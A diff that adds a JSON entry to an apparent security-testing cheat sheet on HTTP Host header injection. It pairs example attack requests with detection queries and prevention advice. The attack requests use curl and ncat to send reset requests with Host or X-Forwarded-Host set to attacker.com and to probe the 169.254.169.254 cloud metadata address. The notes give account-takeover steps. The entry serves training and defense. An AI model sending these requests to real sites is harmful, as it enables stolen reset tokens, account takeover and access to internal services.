@@ -1,0 +1,104 @@
+{
+  "id": "web-host-header-injection",
+  "name": "Host Header Injection (Reset Poisoning, Routing SSRF)",
+  "command": "POST /forgot-password HTTP/1.1\\nHost: attacker.com\\n\\nemail=<user>",
+  "description": "Abuses an application's trust in the HTTP Host (or X-Forwarded-Host) header. Primary impacts: password-reset poisoning (the reset link is built from the attacker-controlled host so the token is sent to the attacker), routing-based SSRF (manipulating the host to reach internal systems through the front-end), cache issues, and authentication/validation bypass via an injected or duplicated Host header.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Web",
+  "subcategory": "Server-Side",
+  "certifications": [
+    "CWES"
+  ],
+  "primary_cert": "CWES",
+  "source": "PortSwigger Web Security Academy - HTTP Host header attacks",
+  "tags": [
+    "host-header",
+    "password-reset-poisoning",
+    "routing-ssrf",
+    "x-forwarded-host"
+  ],
+  "mitre": [
+    "T1190",
+    "T1659"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHY IT WORKS ===\n  Apps read the Host header to build absolute URLs (reset links, redirects) or to route requests. If that value is attacker-controlled and trusted, links point at the attacker and routing can be redirected internally.\n\n=== PASSWORD-RESET POISONING ===\n  1. Trigger a reset for the victim's email, but set Host: attacker.com (or X-Forwarded-Host).\n  2. The app emails the victim a link like https://attacker.com/reset?token=... built from your host.\n  3. When the victim clicks, the token hits your server -> account takeover.\n  Variants: inject a second Host header, use X-Forwarded-Host, or Host: target.com:@attacker.com.\n\n=== ROUTING-BASED SSRF ===\n  - Some front-ends route upstream based on the Host header. Changing it can reach internal vhosts or the cloud metadata endpoint.\n  - Try Host: 169.254.169.254, Host: localhost, or internal names; watch for different responses.\n\n=== VALIDATION / AUTH BYPASS ===\n  - Access controls keyed on Host (e.g. 'only Host: internal admin') can be spoofed.\n  - Duplicate Host headers / absolute-URI request line to confuse the parser.\n\n=== TESTS ===\n  - Change Host outright; if the site still works, the header is trusted downstream.\n  - Add X-Forwarded-Host: attacker.com and look for it reflected in links/redirects.\n  - Use Burp Repeater; inspect reset emails / Location headers.",
+  "examples": [
+    {
+      "label": "Password-reset poisoning via X-Forwarded-Host",
+      "command": "curl -s https://<target>/forgot-password -H 'X-Forwarded-Host: attacker.com' -d 'email=<user>'"
+    },
+    {
+      "label": "Routing SSRF probe to cloud metadata",
+      "command": "curl -s https://<target>/ -H 'Host: 169.254.169.254'"
+    },
+    {
+      "label": "Duplicate Host header to test parser trust",
+      "command": "printf 'GET / HTTP/1.1\\r\\nHost: <target>\\r\\nHost: attacker.com\\r\\n\\r\\n' | ncat --ssl <target> 443"
+    }
+  ],
+  "references": [
+    {
+      "title": "PortSwigger - HTTP Host header attacks",
+      "url": "https://portswigger.net/web-security/host-header"
+    },
+    {
+      "title": "PortSwigger - Password reset poisoning",
+      "url": "https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning"
+    },
+    {
+      "title": "OWASP - Testing for Host Header Injection",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "web-cache-poisoning",
+      "note": "Host-header reflection is a primary unkeyed input for poisoning a cache.",
+      "rel": "next"
+    },
+    {
+      "id": "ssrf-identify",
+      "note": "Routing-based Host abuse is a path into SSRF of internal services.",
+      "rel": "next"
+    },
+    {
+      "id": "auth-vuln-password-reset",
+      "note": "Reset-poisoning is one of several password-reset takeover techniques.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The application builds security-sensitive URLs (password-reset links, redirects) or routing decisions from the client-controlled Host / X-Forwarded-Host header, so an attacker who changes it redirects tokens to their server or reaches internal upstreams.",
+    "prerequisites": "An app that reflects or routes on the Host/X-Forwarded-Host header and does not validate it against an allow-list. For reset poisoning, the ability to trigger a reset for the victim's account.",
+    "impact": "Account takeover via stolen reset tokens, SSRF into internal services and cloud metadata, cache poisoning, and bypass of Host-based access controls.",
+    "detection": "[MITRE T1190] Requests whose Host or X-Forwarded-Host does not match the site's canonical domain(s), duplicate Host headers, Host values pointing at RFC1918/link-local addresses, and password-reset emails whose link host differs from the canonical host.",
+    "artifacts": "Reverse-proxy/web access logs capturing the Host and X-Forwarded-Host headers, mail-gateway logs of outbound reset links, and application logs of reset-token generation.",
+    "splunk_spl": "index=web uri_path=\"/forgot-password\"\n| rex field=_raw \"X-Forwarded-Host:\\s*(?<xfh>[^\\r\\n]+)\"\n| rex field=_raw \"\\nHost:\\s*(?<host>[^\\r\\n]+)\"\n| where (isnotnull(xfh) AND xfh!=\"<target>\") OR (isnotnull(host) AND host!=\"<target>\")\n| stats count by clientip, host, xfh",
+    "elastic_kql": "url.path:\"/forgot-password\" and (http.request.headers.x-forwarded-host:* and not http.request.headers.x-forwarded-host:\"<target>\")",
+    "sentinel_kql": "W3CIISLog\n| where csUriStem =~ \"/forgot-password\"\n| extend host = csHost\n| where host != \"<target>\"\n| summarize count() by cIP, host",
+    "sigma_rules": "web_host_header_injection_reset_poisoning",
+    "prevention": "Do not trust the Host header for anything security-relevant: build absolute URLs from a server-side configured canonical domain, validate Host against an allow-list and return 400 otherwise, strip or ignore X-Forwarded-Host unless set by your own edge, and bind reset tokens to the account and a fixed base URL.",
+    "sources": [
+      "https://portswigger.net/web-security/host-header",
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "Password-reset request with off-domain Host / X-Forwarded-Host",
+        "logic": "index=web sourcetype=apache uri_path=\"/forgot-password\"\n| rex field=_raw \"X-Forwarded-Host:\\s*(?<xfh>[^\\r\\n]+)\"\n| rex field=_raw \"\\nHost:\\s*(?<host>[^\\r\\n]+)\"\n| where (isnotnull(host) AND NOT match(host, \"^<target>$\")) OR (isnotnull(xfh) AND NOT match(xfh, \"^<target>$\"))\n| stats count by clientip, host, xfh",
+        "data_source": "apache",
+        "attack": [
+          "T1190"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate alternate domains / vanity hosts the app genuinely serves.",
+        "tuning": "Allow-list every canonical and vanity host; alert only on reset endpoints with an unrecognized host value."
+      }
+    ]
+  }
+}
